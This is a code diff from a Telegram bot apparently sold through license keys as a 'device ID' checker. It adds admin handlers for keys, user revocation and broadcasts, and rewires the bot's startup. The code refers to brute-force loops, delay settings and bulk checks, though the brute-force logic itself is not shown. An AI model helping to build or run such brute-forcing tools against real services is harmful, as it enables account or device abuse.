+        await update.message.reply_text(f"✅ Key <code>{key_code}</code> deleted!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    else:
+        await update.message.reply_text(f"❌ Key not found!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    return ConversationHandler.END
+
+async def handle_admin_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.lower() == '/cancel':
+        context.user_data.pop("admin_conv_state", None)
+        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
+        return ConversationHandler.END
+    
+    try:
+        user_id = int(text)
+    except:
+        await update.message.reply_text("❌ Invalid User ID! Try again:")
+        context.user_data["admin_conv_state"] = "revoke_user"
+        return STATE_ADMIN_REVOKE_USER
+    
+    context.user_data.pop("admin_conv_state", None)
+    if revoke_user_access(user_id):
+        await update.message.reply_text(f"✅ User <code>{user_id}</code> revoked!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    else:
+        await update.message.reply_text(f"❌ User not found!", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    return ConversationHandler.END
+
+async def handle_admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    context.user_data.pop("admin_conv_state", None)
+    if text.lower() == '/cancel':
+        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
+        return ConversationHandler.END
+    
+    users = list_all_users()
+    sent = 0
+    failed = 0
+    for u in users:
+        if u.get("status") == "active":
+            try:
+                await context.bot.send_message(
+                    chat_id=u["user_id"],
+                    text=f"📢 <b>BROADCAST</b>\n═══════════════════════════\n\n{escape_html(text)}",
+                    parse_mode=ParseMode.HTML
+                )
+                sent += 1
+            except:
+                failed += 1
+            await asyncio.sleep(0.05)
+    
+    await update.message.reply_text(
+        f"✅ <b>Broadcast Complete!</b>\nSent: {sent} | Failed: {failed}",
+        parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard()
+    )
+    return ConversationHandler.END
+
+async def handle_admin_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text.strip()
+    if text.lower() == '/cancel':
+        context.user_data.pop("admin_conv_state", None)
+        await update.message.reply_text("❌ Cancelled.", reply_markup=admin_panel_keyboard())
+        return ConversationHandler.END
+    
+    try:
+        target_id = int(text)
+    except:
+        await update.message.reply_text("❌ Invalid User ID! Try again:")
+        context.user_data["admin_conv_state"] = "add_user"
+        return STATE_ADMIN_ADDUSER_ID
+    
+    context.user_data.pop("admin_conv_state", None)
+    
+    key_data = create_key(0, 1, f"admin_manual_{update.effective_user.id}")
+    now = datetime.now(TZ_WIB)
+    
+    with USERS_LOCK:
+        users_db = load_json(USERS_FILE)
+        users_db[str(target_id)] = {
+            "user_id": target_id,
+            "username": f"Manual_{target_id}",
+            "key": key_data["key"],
+            "activated_at": now.isoformat(),
+            "expires_at": None,
+            "duration_days": 0,
+            "status": "active"
+        }
+        save_json(USERS_FILE, users_db)
+    
+    with KEYS_LOCK:
+        keys_db = load_json(KEYS_FILE)
+        keys_db[key_data["key"]]["uses"] = 1
+        keys_db[key_data["key"]]["status"] = "used"
+        keys_db[key_data["key"]]["activated_by"].append({
+            "user_id": target_id, "username": f"Manual_{target_id}",
+            "activated_at": now.isoformat()
+        })
+        save_json(KEYS_FILE, keys_db)
+    
+    await update.message.reply_text(
+        f"✅ <b>User Added!</b>\n"
+        f"🆔 User ID: <code>{target_id}</code>\n"
+        f"♾️ Access: Lifetime",
+        parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard()
+    )
+    return ConversationHandler.END
+
+# ────────────────────────────────────────────────────────────────
+# 28. MAIN
 # ────────────────────────────────────────────────────────────────
 
 def main():
-    """Start the bot"""
-    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ Please set your BOT_TOKEN in the script!")
-        print("Open the script and replace 'YOUR_BOT_TOKEN_HERE' with your bot token.")
-        sys.exit(1)
+    print("=" * 60)
+    print("🤖 PREMIUM DEVICE ID BOT V1.0")
+    print("👑 Created by: @ZyronDevv")
+    print("=" * 60)
+    print(f"📁 Output Dir: {OUTPUT_DIR}")
+    print(f"🔑 Keys File: {KEYS_FILE}")
+    print(f"👥 Users File: {USERS_FILE}")
+    print(f"⚡ BF Limits File: {BF_LIMITS_FILE}")
+    print(f"🛡️ Admin IDs: {ADMIN_IDS}")
+    print("=" * 60)
+    print("🚀 Starting bot...")
     
-    try:
-        application = (
-            Application.builder()
-            .token(BOT_TOKEN)
-            .connect_timeout(30.0)
-            .read_timeout(30.0)
-            .write_timeout(30.0)
-            .build()
-        )
-        
-        # Add command handlers
-        application.add_handler(CommandHandler("start", start_command))
-        application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("redeem", redeem_command))
-        application.add_handler(CommandHandler("status", status_command))
-        application.add_handler(CommandHandler("cancel", cancel_command))
-        
-        # Add callback query handlers
-        application.add_handler(CallbackQueryHandler(menu_callback, pattern="^menu_"))
-        application.add_handler(CallbackQueryHandler(keys_callback, pattern="^keys_|^kg_|^key_"))
-        application.add_handler(CallbackQueryHandler(start_bulk_check_callback, pattern="^bulk_start$"))
-        application.add_handler(CallbackQueryHandler(download_bulk_callback, pattern="^download_bulk$"))
-        application.add_handler(CallbackQueryHandler(brute_callback, pattern="^brute_"))
-        
-        # Add message handler
-        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-        application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
-        
-        # Add error handler
-        application.add_error_handler(error_handler)
-        
-        print("🤖 Premium Devid Seker Bot v5.2")
-        print("👑 Created by: @ZyronDevv")
-        print("🔗 Bot is running...")
-        print("📊 Press Ctrl+C to stop")
-        print("🛑 Brute Force now has a STOP button!")
-        
-        application.run_polling(
-            allowed_updates=Update.ALL_TYPES,
-            drop_pending_updates=True
-        )
+    if not os.path.exists(KEYS_FILE):
+        save_json(KEYS_FILE, {})
+    if not os.path.exists(USERS_FILE):
+        save_json(USERS_FILE, {})
+    if not os.path.exists(BF_LIMITS_FILE):
+        save_json(BF_LIMITS_FILE, {"device_limit": 1, "users": {}, "user_overrides": {}})
+
     
-    except Exception as e:
-        logger.error(f"Failed to start bot: {e}")
+    app = Application.builder().token(BOT_TOKEN).build()
+    
+    # Commands
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("redeem", cmd_redeem))
+    app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CommandHandler("mykey", cmd_mykey))
+    app.add_handler(CommandHandler("cancel", cmd_cancel))
+    
+    # Inline button callbacks
+    app.add_handler(CallbackQueryHandler(callback_handler))
+    
+    # ─── IMPORTANT: Register document handler FIRST ───
+    # This must come before the ConversationHandler to catch file uploads
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))
+    
+    # ConversationHandler for text input states
+    conv_handler = ConversationHandler(
+        entry_points=[
+            MessageHandler(filters.TEXT & ~filters.COMMAND, _conversation_router),
+        ],
+        states={
+            STATE_BF_CUSTOM_LOOPS: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bf_custom_loops)
+            ],
+            STATE_BF_CUSTOM_DELAY: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_bf_custom_delay)
+            ],
+            STATE_ADMIN_DELETE_KEY: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_delete_key)
+            ],
+            STATE_ADMIN_REVOKE_USER: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_revoke)
+            ],
+            STATE_ADMIN_BROADCAST: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_broadcast)
+            ],
+            STATE_ADMIN_ADDUSER_ID: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_adduser)
+            ],
+        },
+        fallbacks=[CommandHandler("cancel", cmd_cancel)],
+        per_user=True,
+        per_chat=True,
+        per_message=True,  # Changed to False to avoid conflicts
+        allow_reentry=True,
+    )
+    app.add_handler(conv_handler)
+    
+    # UNIFIED text handler for general messages
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_text_input))
+    
+    print("✅ Bot is running! Press Ctrl+C to stop.")
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\n\n👋 Bot stopped.")
+        print("\n\n⚠️ Bot stopped by user.")
     except Exception as e:
         print(f"\n❌ Error: {e}")
         import traceback
